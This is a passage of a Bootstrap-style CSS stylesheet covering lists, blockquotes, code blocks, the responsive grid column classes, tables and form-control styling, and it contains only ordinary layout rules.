        ul ol,
        ol ol {
            margin-bottom: 0;
        }

        .list-unstyled {
            padding-left: 0;
            list-style: none;
        }

        .list-inline {
            padding-left: 0;
            list-style: none;
            margin-left: -5px;
        }

        .list-inline>li {
            display: inline-block;
            padding-right: 5px;
            padding-left: 5px;
        }

        dl {
            margin-top: 0;
            margin-bottom: 20px;
        }

        dt,
        dd {
            line-height: 1.42857143;
        }

        dt {
            font-weight: 700;
        }

        dd {
            margin-left: 0;
        }

        @media (min-width: 768px) {
            .dl-horizontal dt {
                float: left;
                width: 160px;
                clear: left;
                text-align: right;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .dl-horizontal dd {
                margin-left: 180px;
            }
        }

        abbr[title],
        abbr[data-original-title] {
            cursor: help;
        }

        .initialism {
            font-size: 90%;
            text-transform: uppercase;
        }

        blockquote {
            padding: 10px 20px;
            margin: 0 0 20px;
            font-size: 17.5px;
            border-left: 5px solid #eee;
        }

        blockquote p:last-child,
        blockquote ul:last-child,
        blockquote ol:last-child {
            margin-bottom: 0;
        }

        blockquote footer,
        blockquote small,
        blockquote .small {
            display: block;
            font-size: 80%;
            line-height: 1.42857143;
            color: #777;
        }

        blockquote footer:before,
        blockquote small:before,
        blockquote .small:before {
            content: "\2014 \00A0";
        }

        .blockquote-reverse,
        blockquote.pull-right {
            padding-right: 15px;
            padding-left: 0;
            text-align: right;
            border-right: 5px solid #eee;
            border-left: 0;
        }

        .blockquote-reverse footer:before,
        blockquote.pull-right footer:before,
        .blockquote-reverse small:before,
        blockquote.pull-right small:before,
        .blockquote-reverse .small:before,
        blockquote.pull-right .small:before {
            content: "";
        }

        .blockquote-reverse footer:after,
        blockquote.pull-right footer:after,
        .blockquote-reverse small:after,
        blockquote.pull-right small:after,
        .blockquote-reverse .small:after,
        blockquote.pull-right .small:after {
            content: "\00A0 \2014";
        }

        address {
            margin-bottom: 20px;
            font-style: normal;
            line-height: 1.42857143;
        }

        code,
        kbd,
        pre,
        samp {
            font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
        }

        code {
            padding: 2px 4px;
            font-size: 90%;
            color: #c7254e;
            background-color: #f9f2f4;
            border-radius: 3px;
        }

        kbd {
            padding: 2px 4px;
            font-size: 90%;
            color: #fff;
            background-color: #333;
            border-radius: 3px;
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.25);
        }

        kbd kbd {
            padding: 0;
            font-size: 100%;
            font-weight: 700;
            box-shadow: none;
        }

        pre {
            display: block;
            padding: 9.5px;
            margin: 0 0 10px;
            font-size: 13px;
            line-height: 1.42857143;
            color: #333;
            word-break: break-all;
            word-wrap: break-word;
            background-color: #f5f5f5;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        pre code {
            padding: 0;
            font-size: inherit;
            color: inherit;
            white-space: pre-wrap;
            background-color: transparent;
            border-radius: 0;
        }

        .pre-scrollable {
            max-height: 340px;
            overflow-y: scroll;
        }

        .container {
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto;
        }

        @media (min-width: 768px) {
            .container {
                width: 750px;
            }
        }

        @media (min-width: 992px) {
            .container {
                width: 900px;
            }
        }

        @media (min-width: 1200px) {
            .container {
                width: 900px;
            }
        }

        .container-fluid {
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto;
        }

        .row {
            margin-right: -15px;
            margin-left: -15px;
        }

        .row-no-gutters {
            margin-right: 0;
            margin-left: 0;
        }

        .row-no-gutters [class*="col-"] {
            padding-right: 0;
            padding-left: 0;
        }

        .col-xs-1,
        .col-sm-1,
        .col-md-1,
        .col-lg-1,
        .col-xs-2,
        .col-sm-2,
        .col-md-2,
        .col-lg-2,
        .col-xs-3,
        .col-sm-3,
        .col-md-3,
        .col-lg-3,
        .col-xs-4,
        .col-sm-4,
        .col-md-4,
        .col-lg-4,
        .col-xs-5,
        .col-sm-5,
        .col-md-5,
        .col-lg-5,
        .col-xs-6,
        .col-sm-6,
        .col-md-6,
        .col-lg-6,
        .col-xs-7,
        .col-sm-7,
        .col-md-7,
        .col-lg-7,
        .col-xs-8,
        .col-sm-8,
        .col-md-8,
        .col-lg-8,
        .col-xs-9,
        .col-sm-9,
        .col-md-9,
        .col-lg-9,
        .col-xs-10,
        .col-sm-10,
        .col-md-10,
        .col-lg-10,
        .col-xs-11,
        .col-sm-11,
        .col-md-11,
        .col-lg-11,
        .col-xs-12,
        .col-sm-12,
        .col-md-12,
        .col-lg-12 {
            position: relative;
            min-height: 1px;
            padding-right: 15px;
            padding-left: 15px;
        }

        .col-xs-1,
        .col-xs-2,
        .col-xs-3,
        .col-xs-4,
        .col-xs-5,
        .col-xs-6,
        .col-xs-7,
        .col-xs-8,
        .col-xs-9,
        .col-xs-10,
        .col-xs-11,
        .col-xs-12 {
            float: left;
        }

        .col-xs-12 {
            width: 100%;
        }

        .col-xs-11 {
            width: 91.66666667%;
        }

        .col-xs-10 {
            width: 83.33333333%;
        }

        .col-xs-9 {
            width: 75%;
        }

        .col-xs-8 {
            width: 66.66666667%;
        }

        .col-xs-7 {
            width: 58.33333333%;
        }

        .col-xs-6 {
            width: 50%;
        }

        .col-xs-5 {
            width: 41.66666667%;
        }

        .col-xs-4 {
            width: 33.33333333%;
        }

        .col-xs-3 {
            width: 25%;
        }

        .col-xs-2 {
            width: 16.66666667%;
        }

        .col-xs-1 {
            width: 8.33333333%;
        }

        .col-xs-pull-12 {
            right: 100%;
        }

        .col-xs-pull-11 {
            right: 91.66666667%;
        }

        .col-xs-pull-10 {
            right: 83.33333333%;
        }

        .col-xs-pull-9 {
            right: 75%;
        }

        .col-xs-pull-8 {
            right: 66.66666667%;
        }

        .col-xs-pull-7 {
            right: 58.33333333%;
        }

        .col-xs-pull-6 {
            right: 50%;
        }

        .col-xs-pull-5 {
            right: 41.66666667%;
        }

        .col-xs-pull-4 {
            right: 33.33333333%;
        }

        .col-xs-pull-3 {
            right: 25%;
        }

        .col-xs-pull-2 {
            right: 16.66666667%;
        }

        .col-xs-pull-1 {
            right: 8.33333333%;
        }

        .col-xs-pull-0 {
            right: auto;
        }

        .col-xs-push-12 {
            left: 100%;
        }

        .col-xs-push-11 {
            left: 91.66666667%;
        }

        .col-xs-push-10 {
            left: 83.33333333%;
        }

        .col-xs-push-9 {
            left: 75%;
        }

        .col-xs-push-8 {
            left: 66.66666667%;
        }

        .col-xs-push-7 {
            left: 58.33333333%;
        }

        .col-xs-push-6 {
            left: 50%;
        }

        .col-xs-push-5 {
            left: 41.66666667%;
        }

        .col-xs-push-4 {
            left: 33.33333333%;
        }

        .col-xs-push-3 {
            left: 25%;
        }

        .col-xs-push-2 {
            left: 16.66666667%;
        }

        .col-xs-push-1 {
            left: 8.33333333%;
        }

        .col-xs-push-0 {
            left: auto;
        }

        .col-xs-offset-12 {
            margin-left: 100%;
        }

        .col-xs-offset-11 {
            margin-left: 91.66666667%;
        }

        .col-xs-offset-10 {
            margin-left: 83.33333333%;
        }

        .col-xs-offset-9 {
            margin-left: 75%;
        }

        .col-xs-offset-8 {
            margin-left: 66.66666667%;
        }

        .col-xs-offset-7 {
            margin-left: 58.33333333%;
        }

        .col-xs-offset-6 {
            margin-left: 50%;
        }

        .col-xs-offset-5 {
            margin-left: 41.66666667%;
        }

        .col-xs-offset-4 {
            margin-left: 33.33333333%;
        }

        .col-xs-offset-3 {
            margin-left: 25%;
        }

        .col-xs-offset-2 {
            margin-left: 16.66666667%;
        }

        .col-xs-offset-1 {
            margin-left: 8.33333333%;
        }

        .col-xs-offset-0 {
            margin-left: 0;
        }

        @media (min-width: 768px) {

            .col-sm-1,
            .col-sm-2,
            .col-sm-3,
            .col-sm-4,
            .col-sm-5,
            .col-sm-6,
            .col-sm-7,
            .col-sm-8,
            .col-sm-9,
            .col-sm-10,
            .col-sm-11,
            .col-sm-12 {
                float: left;
            }

            .col-sm-12 {
                width: 100%;
            }

            .col-sm-11 {
                width: 91.66666667%;
            }

            .col-sm-10 {
                width: 83.33333333%;
            }

            .col-sm-9 {
                width: 75%;
            }

            .col-sm-8 {
                width: 66.66666667%;
            }

            .col-sm-7 {
                width: 58.33333333%;
            }

            .col-sm-6 {
                width: 50%;
            }

            .col-sm-5 {
                width: 41.66666667%;
            }

            .col-sm-4 {
                width: 33.33333333%;
            }

            .col-sm-3 {
                width: 25%;
            }

            .col-sm-2 {
                width: 16.66666667%;
            }

            .col-sm-1 {
                width: 8.33333333%;
            }

            .col-sm-pull-12 {
                right: 100%;
            }

            .col-sm-pull-11 {
                right: 91.66666667%;
            }

            .col-sm-pull-10 {
                right: 83.33333333%;
            }

            .col-sm-pull-9 {
                right: 75%;
            }

            .col-sm-pull-8 {
                right: 66.66666667%;
            }

            .col-sm-pull-7 {
                right: 58.33333333%;
            }

            .col-sm-pull-6 {
                right: 50%;
            }

            .col-sm-pull-5 {
                right: 41.66666667%;
            }

            .col-sm-pull-4 {
                right: 33.33333333%;
            }

            .col-sm-pull-3 {
                right: 25%;
            }

            .col-sm-pull-2 {
                right: 16.66666667%;
            }

            .col-sm-pull-1 {
                right: 8.33333333%;
            }

            .col-sm-pull-0 {
                right: auto;
            }

            .col-sm-push-12 {
                left: 100%;
            }

            .col-sm-push-11 {
                left: 91.66666667%;
            }

            .col-sm-push-10 {
                left: 83.33333333%;
            }

            .col-sm-push-9 {
                left: 75%;
            }

            .col-sm-push-8 {
                left: 66.66666667%;
            }

            .col-sm-push-7 {
                left: 58.33333333%;
            }

            .col-sm-push-6 {
                left: 50%;
            }

            .col-sm-push-5 {
                left: 41.66666667%;
            }

            .col-sm-push-4 {
                left: 33.33333333%;
            }

            .col-sm-push-3 {
                left: 25%;
            }

            .col-sm-push-2 {
                left: 16.66666667%;
            }

            .col-sm-push-1 {
                left: 8.33333333%;
            }

            .col-sm-push-0 {
                left: auto;
            }

            .col-sm-offset-12 {
                margin-left: 100%;
            }

            .col-sm-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-sm-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-sm-offset-9 {
                margin-left: 75%;
            }

            .col-sm-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-sm-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-sm-offset-6 {
                margin-left: 50%;
            }

            .col-sm-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-sm-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-sm-offset-3 {
                margin-left: 25%;
            }

            .col-sm-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-sm-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-sm-offset-0 {
                margin-left: 0;
            }
        }

        @media (min-width: 992px) {

            .col-md-1,
            .col-md-2,
            .col-md-3,
            .col-md-4,
            .col-md-5,
            .col-md-6,
            .col-md-7,
            .col-md-8,
            .col-md-9,
            .col-md-10,
            .col-md-11,
            .col-md-12 {
                float: left;
            }

            .col-md-12 {
                width: 100%;
            }

            .col-md-11 {
                width: 91.66666667%;
            }

            .col-md-10 {
                width: 83.33333333%;
            }

            .col-md-9 {
                width: 75%;
            }

            .col-md-8 {
                width: 66.66666667%;
            }

            .col-md-7 {
                width: 58.33333333%;
            }

            .col-md-6 {
                width: 50%;
            }

            .col-md-5 {
                width: 41.66666667%;
            }

            .col-md-4 {
                width: 33.33333333%;
            }

            .col-md-3 {
                width: 25%;
            }

            .col-md-2 {
                width: 16.66666667%;
            }

            .col-md-1 {
                width: 8.33333333%;
            }

            .col-md-pull-12 {
                right: 100%;
            }

            .col-md-pull-11 {
                right: 91.66666667%;
            }

            .col-md-pull-10 {
                right: 83.33333333%;
            }

            .col-md-pull-9 {
                right: 75%;
            }

            .col-md-pull-8 {
                right: 66.66666667%;
            }

            .col-md-pull-7 {
                right: 58.33333333%;
            }

            .col-md-pull-6 {
                right: 50%;
            }

            .col-md-pull-5 {
                right: 41.66666667%;
            }

            .col-md-pull-4 {
                right: 33.33333333%;
            }

            .col-md-pull-3 {
                right: 25%;
            }

            .col-md-pull-2 {
                right: 16.66666667%;
            }

            .col-md-pull-1 {
                right: 8.33333333%;
            }

            .col-md-pull-0 {
                right: auto;
            }

            .col-md-push-12 {
                left: 100%;
            }

            .col-md-push-11 {
                left: 91.66666667%;
            }

            .col-md-push-10 {
                left: 83.33333333%;
            }

            .col-md-push-9 {
                left: 75%;
            }

            .col-md-push-8 {
                left: 66.66666667%;
            }

            .col-md-push-7 {
                left: 58.33333333%;
            }

            .col-md-push-6 {
                left: 50%;
            }

            .col-md-push-5 {
                left: 41.66666667%;
            }

            .col-md-push-4 {
                left: 33.33333333%;
            }

            .col-md-push-3 {
                left: 25%;
            }

            .col-md-push-2 {
                left: 16.66666667%;
            }

            .col-md-push-1 {
                left: 8.33333333%;
            }

            .col-md-push-0 {
                left: auto;
            }

            .col-md-offset-12 {
                margin-left: 100%;
            }

            .col-md-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-md-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-md-offset-9 {
                margin-left: 75%;
            }

            .col-md-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-md-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-md-offset-6 {
                margin-left: 50%;
            }

            .col-md-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-md-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-md-offset-3 {
                margin-left: 25%;
            }

            .col-md-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-md-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-md-offset-0 {
                margin-left: 0;
            }
        }

        @media (min-width: 1200px) {

            .col-lg-1,
            .col-lg-2,
            .col-lg-3,
            .col-lg-4,
            .col-lg-5,
            .col-lg-6,
            .col-lg-7,
            .col-lg-8,
            .col-lg-9,
            .col-lg-10,
            .col-lg-11,
            .col-lg-12 {
                float: left;
            }

            .col-lg-12 {
                width: 100%;
            }

            .col-lg-11 {
                width: 91.66666667%;
            }

            .col-lg-10 {
                width: 83.33333333%;
            }

            .col-lg-9 {
                width: 75%;
            }

            .col-lg-8 {
                width: 66.66666667%;
            }

            .col-lg-7 {
                width: 58.33333333%;
            }

            .col-lg-6 {
                width: 50%;
            }

            .col-lg-5 {
                width: 41.66666667%;
            }

            .col-lg-4 {
                width: 33.33333333%;
            }

            .col-lg-3 {
                width: 25%;
            }

            .col-lg-2 {
                width: 16.66666667%;
            }

            .col-lg-1 {
                width: 8.33333333%;
            }

            .col-lg-pull-12 {
                right: 100%;
            }

            .col-lg-pull-11 {
                right: 91.66666667%;
            }

            .col-lg-pull-10 {
                right: 83.33333333%;
            }

            .col-lg-pull-9 {
                right: 75%;
            }

            .col-lg-pull-8 {
                right: 66.66666667%;
            }

            .col-lg-pull-7 {
                right: 58.33333333%;
            }

            .col-lg-pull-6 {
                right: 50%;
            }

            .col-lg-pull-5 {
                right: 41.66666667%;
            }

            .col-lg-pull-4 {
                right: 33.33333333%;
            }

            .col-lg-pull-3 {
                right: 25%;
            }

            .col-lg-pull-2 {
                right: 16.66666667%;
            }

            .col-lg-pull-1 {
                right: 8.33333333%;
            }

            .col-lg-pull-0 {
                right: auto;
            }

            .col-lg-push-12 {
                left: 100%;
            }

            .col-lg-push-11 {
                left: 91.66666667%;
            }

            .col-lg-push-10 {
                left: 83.33333333%;
            }

            .col-lg-push-9 {
                left: 75%;
            }

            .col-lg-push-8 {
                left: 66.66666667%;
            }

            .col-lg-push-7 {
                left: 58.33333333%;
            }

            .col-lg-push-6 {
                left: 50%;
            }

            .col-lg-push-5 {
                left: 41.66666667%;
            }

            .col-lg-push-4 {
                left: 33.33333333%;
            }

            .col-lg-push-3 {
                left: 25%;
            }

            .col-lg-push-2 {
                left: 16.66666667%;
            }

            .col-lg-push-1 {
                left: 8.33333333%;
            }

            .col-lg-push-0 {
                left: auto;
            }

            .col-lg-offset-12 {
                margin-left: 100%;
            }

            .col-lg-offset-11 {
                margin-left: 91.66666667%;
            }

            .col-lg-offset-10 {
                margin-left: 83.33333333%;
            }

            .col-lg-offset-9 {
                margin-left: 75%;
            }

            .col-lg-offset-8 {
                margin-left: 66.66666667%;
            }

            .col-lg-offset-7 {
                margin-left: 58.33333333%;
            }

            .col-lg-offset-6 {
                margin-left: 50%;
            }

            .col-lg-offset-5 {
                margin-left: 41.66666667%;
            }

            .col-lg-offset-4 {
                margin-left: 33.33333333%;
            }

            .col-lg-offset-3 {
                margin-left: 25%;
            }

            .col-lg-offset-2 {
                margin-left: 16.66666667%;
            }

            .col-lg-offset-1 {
                margin-left: 8.33333333%;
            }

            .col-lg-offset-0 {
                margin-left: 0;
            }
        }

        table {
            background-color: transparent;
        }

        table col[class*="col-"] {
            position: static;
            display: table-column;
            float: none;
        }

        table td[class*="col-"],
        table th[class*="col-"] {
            position: static;
            display: table-cell;
            float: none;
        }

        caption {
            padding-top: 8px;
            padding-bottom: 8px;
            color: #777;
            text-align: left;
        }

        th {
            text-align: left;
        }

        .table {
            width: 100%;
            max-width: 100%;
            margin-bottom: 20px;
        }

        .table>thead>tr>th,
        .table>tbody>tr>th,
        .table>tfoot>tr>th,
        .table>thead>tr>td,
        .table>tbody>tr>td,
        .table>tfoot>tr>td {
            padding: 8px;
            line-height: 1.42857143;
            vertical-align: top;
            border-top: 1px solid #ddd;
        }

        .table>thead>tr>th {
            vertical-align: bottom;
            border-bottom: 2px solid #ddd;
        }

        .table>caption+thead>tr:first-child>th,
        .table>colgroup+thead>tr:first-child>th,
        .table>thead:first-child>tr:first-child>th,
        .table>caption+thead>tr:first-child>td,
        .table>colgroup+thead>tr:first-child>td,
        .table>thead:first-child>tr:first-child>td {
            border-top: 0;
        }

        .table>tbody+tbody {
            border-top: 2px solid #ddd;
        }

        .table .table {
            background-color: #fff;
        }

        .table-condensed>thead>tr>th,
        .table-condensed>tbody>tr>th,
        .table-condensed>tfoot>tr>th,
        .table-condensed>thead>tr>td,
        .table-condensed>tbody>tr>td,
        .table-condensed>tfoot>tr>td {
            padding: 5px;
        }

        .table-bordered {
            border: 1px solid #ddd;
        }

        .table-bordered>thead>tr>th,
        .table-bordered>tbody>tr>th,
        .table-bordered>tfoot>tr>th,
        .table-bordered>thead>tr>td,
        .table-bordered>tbody>tr>td,
        .table-bordered>tfoot>tr>td {
            border: 1px solid #ddd;
        }

        .table-bordered>thead>tr>th,
        .table-bordered>thead>tr>td {
            border-bottom-width: 2px;
        }

        .table-striped>tbody>tr:nth-of-type(odd) {
            background-color: #f9f9f9;
        }

        .table-hover>tbody>tr:hover {
            background-color: #f5f5f5;
        }

        .table>thead>tr>td.active,
        .table>tbody>tr>td.active,
        .table>tfoot>tr>td.active,
        .table>thead>tr>th.active,
        .table>tbody>tr>th.active,
        .table>tfoot>tr>th.active {
            background-color: #f5f5f5;
        }

        .table-hover>tbody>tr>td.active:hover,
        .table-hover>tbody>tr>th.active:hover {
            background-color: #e8e8e8;
        }

        .table>thead>tr>td.success,
        .table>tbody>tr>td.success,
        .table>tfoot>tr>td.success,
        .table>thead>tr>th.success,
        .table>tbody>tr>th.success,
        .table>tfoot>tr>th.success {
            background-color: #dff0d8;
        }

        .table-hover>tbody>tr>td.success:hover,
        .table-hover>tbody>tr>th.success:hover {
            background-color: #d0e9c6;
        }

        .table>thead>tr>td.info,
        .table>tbody>tr>td.info,
        .table>tfoot>tr>td.info,
        .table>thead>tr>th.info,
        .table>tbody>tr>th.info,
        .table>tfoot>tr>th.info {
            background-color: #d9edf7;
        }

        .table-hover>tbody>tr>td.info:hover,
        .table-hover>tbody>tr>th.info:hover {
            background-color: #c4e3f3;
        }

        .table>thead>tr>td.warning,
        .table>tbody>tr>td.warning,
        .table>tfoot>tr>td.warning,
        .table>thead>tr>th.warning,
        .table>tbody>tr>th.warning,
        .table>tfoot>tr>th.warning {
            background-color: #fcf8e3;
        }

        .table-hover>tbody>tr>td.warning:hover,
        .table-hover>tbody>tr>th.warning:hover {
            background-color: #faf2cc;
        }

        .table>thead>tr>td.danger,
        .table>tbody>tr>td.danger,
        .table>tfoot>tr>td.danger,
        .table>thead>tr>th.danger,
        .table>tbody>tr>th.danger,
        .table>tfoot>tr>th.danger {
            background-color: #f2dede;
        }

        .table-hover>tbody>tr>td.danger:hover,
        .table-hover>tbody>tr>th.danger:hover {
            background-color: #ebcccc;
        }

        .table-responsive {
            min-height: 0.01%;
            overflow-x: auto;
        }

        @media screen and (max-width: 767px) {
            .table-responsive {
                width: 100%;
                margin-bottom: 15px;
                overflow-y: hidden;
                -ms-overflow-style: -ms-autohiding-scrollbar;
                border: 1px solid #ddd;
            }

            .table-responsive>.table {
                margin-bottom: 0;
            }

            .table-responsive>.table>thead>tr>th,
            .table-responsive>.table>tbody>tr>th,
            .table-responsive>.table>tfoot>tr>th,
            .table-responsive>.table>thead>tr>td,
            .table-responsive>.table>tbody>tr>td,
            .table-responsive>.table>tfoot>tr>td {
                white-space: nowrap;
            }

            .table-responsive>.table-bordered {
                border: 0;
            }

            .table-responsive>.table-bordered>thead>tr>th:first-child,
            .table-responsive>.table-bordered>tbody>tr>th:first-child,
            .table-responsive>.table-bordered>tfoot>tr>th:first-child,
            .table-responsive>.table-bordered>thead>tr>td:first-child,
            .table-responsive>.table-bordered>tbody>tr>td:first-child,
            .table-responsive>.table-bordered>tfoot>tr>td:first-child {
                border-left: 0;
            }

            .table-responsive>.table-bordered>thead>tr>th:last-child,
            .table-responsive>.table-bordered>tbody>tr>th:last-child,
            .table-responsive>.table-bordered>tfoot>tr>th:last-child,
            .table-responsive>.table-bordered>thead>tr>td:last-child,
            .table-responsive>.table-bordered>tbody>tr>td:last-child,
            .table-responsive>.table-bordered>tfoot>tr>td:last-child {
                border-right: 0;
            }

            .table-responsive>.table-bordered>tbody>tr:last-child>th,
            .table-responsive>.table-bordered>tfoot>tr:last-child>th,
            .table-responsive>.table-bordered>tbody>tr:last-child>td,
            .table-responsive>.table-bordered>tfoot>tr:last-child>td {
                border-bottom: 0;
            }
        }

        fieldset {
            min-width: 0;
            padding: 0;
            margin: 0;
            border: 0;
        }

        legend {
            display: block;
            width: 100%;
            padding: 0;
            margin-bottom: 20px;
            font-size: 21px;
            line-height: inherit;
            color: #333;
            border: 0;
            border-bottom: 1px solid #e5e5e5;
        }

        label {
            display: inline-block;
            max-width: 100%;
            margin-bottom: 5px;
            font-weight: 700;
        }

        input[type="search"] {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-appearance: none;
            appearance: none;
        }

        input[type="radio"],
        input[type="checkbox"] {
            margin: 4px 0 0;
            margin-top: 1px \9;
            line-height: normal;
        }

        input[type="radio"][disabled],
        input[type="checkbox"][disabled],
        input[type="radio"].disabled,
        input[type="checkbox"].disabled,
        fieldset[disabled] input[type="radio"],
        fieldset[disabled] input[type="checkbox"] {
            cursor: not-allowed;
        }

        input[type="file"] {
            display: block;
        }

        input[type="range"] {
            display: block;
            width: 100%;
        }

        select[multiple],
        select[size] {
            height: auto;
        }

        input[type="file"]:focus,
        input[type="radio"]:focus,
        input[type="checkbox"]:focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px;
        }

        output {
            display: block;
            padding-top: 5px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555;
        }

        .form-control {
            display: block;
            width: 100%;
            height: 30px;
            padding: 4px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555;
            background-color: #fff;
            background-image: none;
            border: 1px solid #ccc;
            border-radius: 3px;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
        }

        .form-control:focus {
            border-color: #66afe9;
            outline: 0;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
        }

        .form-control::-moz-placeholder {
            color: #999;
            opacity: 1;
        }

        .form-control:-ms-input-placeholder {
            color: #999;
        }

        .form-control::-webkit-input-placeholder {
            color: #999;
        }

        .form-control::-ms-expand {
            background-color: transparent;
            border: 0;
        }

        .form-control[disabled],
        .form-control[readonly],
        fieldset[disabled] .form-control {
            background-color: #eee;
            opacity: 1;
        }

        .form-control[disabled],
        fieldset[disabled] .form-control {
            cursor: not-allowed;
        }

        textarea.form-control {
            height: auto;
        }

        @media screen and (-webkit-min-device-pixel-ratio: 0) {

            input[type="date"].form-control,
            input[type="time"].form-control,
            input[type="datetime-local"].form-control,
            input[type="month"].form-control {
                line-height: 30px;
            }

            input[type="date"].input-sm,
            input[type="time"].input-sm,
            input[type="datetime-local"].input-sm,
            input[type="month"].input-sm,
            .input-group-sm input[type="date"],
            .input-group-sm input[type="time"],
            .input-group-sm input[type="datetime-local"],
            .input-group-sm input[type="month"] {
                line-height: 30px;
            }

            input[type="date"].input-lg,
            input[type="time"].input-lg,
            input[type="datetime-local"].input-lg,
            input[type="month"].input-lg,
            .input-group-lg input[type="date"],
            .input-group-lg input[type="time"],
            .input-group-lg input[type="datetime-local"],
            .input-group-lg input[type="month"] {
                line-height: 46px;
            }
        }

        .form-group {
            margin-bottom: 15px;
        }

        .radio,
        .checkbox {
            position: relative;
            display: block;
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .radio.disabled label,
        .checkbox.disabled label,
        fieldset[disabled] .radio label,
        fieldset[disabled] .checkbox label {
            cursor: not-allowed;
        }

        .radio label,
        .checkbox label {
            min-height: 20px;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            cursor: pointer;
        }

        .radio input[type="radio"],
        .radio-inline input[type="radio"],
        .checkbox input[type="checkbox"],
        .checkbox-inline input[type="checkbox"] {
            position: absolute;
            margin-top: 4px \9;
            margin-left: -20px;
        }

        .radio+.radio,
        .checkbox+.checkbox {
            margin-top: -5px;
        }

        .radio-inline,
        .checkbox-inline {
            position: relative;
            display: inline-block;
            padding-left: 20px;
            margin-bottom: 0;
            font-weight: 400;
            vertical-align: middle;
            cursor: pointer;
        }

        .radio-inline.disabled,
        .checkbox-inline.disabled,
        fieldset[disabled] .radio-inline,
        fieldset[disabled] .checkbox-inline {
            cursor: not-allowed;
        }

        .radio-inline+.radio-inline,
        .checkbox-inline+.checkbox-inline {
            margin-top: 0;
            margin-left: 10px;
        }

        .form-control-static {
            min-height: 34px;
            padding-top: 5px;
            padding-bottom: 5px;
            margin-bottom: 0;
        }

        .form-control-static.input-lg,
        .form-control-static.input-sm {
            padding-right: 0;
            padding-left: 0;
        }

        .input-sm {
            height: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px;
        }

        select.input-sm {
            height: 30px;
            line-height: 30px;
        }

        textarea.input-sm,
        select[multiple].input-sm {
            height: auto;
        }

        .form-group-sm .form-control {
            height: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .form-group-sm select.form-control {
            height: 30px;
            line-height: 30px;
        }

        .form-group-sm textarea.form-control,
        .form-group-sm select[multiple].form-control {
            height: auto;
        }

        .form-group-sm .form-control-static {
            height: 30px;
            min-height: 32px;
            padding: 6px 10px;
            font-size: 12px;
            line-height: 1.5;
        }

        .input-lg {
            height: 46px;
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px;
        }

        select.input-lg {
            height: 46px;
            line-height: 46px;
        }

        textarea.input-lg,
        select[multiple].input-lg {
            height: auto;
        }

        .form-group-lg .form-control {
            height: 46px;
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px;
        }

        .form-group-lg select.form-control {
            height: 46px;
            line-height: 46px;
        }

        .form-group-lg textarea.form-control,
        .form-group-lg select[multiple].form-control {
            height: auto;
        }

        .form-group-lg .form-control-static {
            height: 46px;
            min-height: 38px;
            padding: 11px 16px;
            font-size: 18px;
            line-height: 1.3333333;
        }

        .has-feedback {
            position: relative;
        }

        .has-feedback .form-control {
            padding-right: 37.5px;
        }

        .form-control-feedback {
            position: absolute;
            top: 0;
            right: 0;
            z-index: 2;
            display: block;
            width: 30px;
            height: 30px;
            line-height: 30px;
            text-align: center;
            pointer-events: none;
        }

        .input-lg+.form-control-feedback,
        .input-group-lg+.form-control-feedback,
        .form-group-lg .form-control+.form-control-feedback {
            width: 46px;
            height: 46px;
            line-height: 46px;
        }

        .input-sm+.form-control-feedback,
        .input-group-sm+.form-control-feedback,
        .form-group-sm .form-control+.form-control-feedback {
            width: 30px;
            height: 30px;
            line-height: 30px;
        }

        .has-success .help-block,
        .has-success .control-label,
        .has-success .radio,
        .has-success .checkbox,
        .has-success .radio-inline,
        .has-success .checkbox-inline,
        .has-success.radio label,
        .has-success.checkbox label,
        .has-success.radio-inline label,
        .has-success.checkbox-inline label {
            color: #3c763d;
        }

        .has-success .form-control {
            border-color: #3c763d;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-success .form-control:focus {
            border-color: #2b542c;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
        }

        .has-success .input-group-addon {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #3c763d;
        }

        .has-success .form-control-feedback {
            color: #3c763d;
        }

